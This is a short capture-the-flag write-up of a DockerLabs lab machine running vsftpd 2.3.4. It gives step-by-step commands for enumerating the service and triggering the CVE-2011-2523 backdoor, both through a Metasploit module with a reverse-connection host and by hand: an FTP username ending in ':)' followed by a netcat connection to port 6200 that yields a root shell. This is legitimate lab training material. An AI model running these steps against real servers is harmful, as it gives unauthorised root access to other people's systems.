# FirstHacking - DockerLabs - Very easy

## Summary
The machine runs a vulnerable version of vsftpd (2.3.4) that contains 
a backdoor triggered by sending a username ending with `:)`. Once 
triggered, a root shell is exposed on port 6200.

## Tools
- nmap
- ftp
- netcat
- metasploit

## 1. Enumeration
### Port Scanning
```bash
sudo nmap -sC -sV -p- -O 172.17.0.2
```

```bash
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4
```

We try with the default credentials for the anonymous user with the FTP service, but it doesn't work. So, we search the version of the service and we can see there are some related vulnerabilities. 

## 2. Exploitation
### Metasploit
There is a module on metasploit to generate a backdoor with the FTP service with version 2.3.4. 

```bash
msfconsole
search vsftpd
use 1
set RHOSTS 172.17.0.2
set LHOST 192.168.1.23
run
# Backdoor spawned but no session created — likely due to Docker NAT blocking reverse connection
```

### Manual Exploitation

But the payload does not work, so we try to activate the backdoor following this way:
```bash
# Terminal 1
ftp 172.17.0.2
# Name: user:)
# Pass: anything

# Terminal 2
nc 172.17.0.2 6200

# Verify 
whoami
> root
```


## 3. Lessons Learned
- `vsftpd 2.3.4` contains a hardcoded backdoor triggered by `:)` in the username (CVE-2011-2523)
- Metasploit reverse payloads may fail in Docker/NAT environments — always know the manual method
- When Metasploit fails, check if the backdoor port (6200) is open with `nc` directly
- Service version from nmap is enough to identify the attack vector — no need to guess

## Flags
- **Root proof:** `whoami` → root (direct root, no privesc needed)
